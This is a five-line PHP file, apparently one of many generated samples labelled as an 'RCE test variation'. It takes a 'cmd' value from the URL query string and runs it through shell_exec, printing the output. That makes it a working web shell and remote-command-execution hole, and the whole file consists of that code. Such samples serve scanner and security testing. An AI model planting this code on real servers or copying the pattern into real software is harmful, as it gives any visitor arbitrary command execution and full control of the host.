<?php
// RCE test variation #533
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>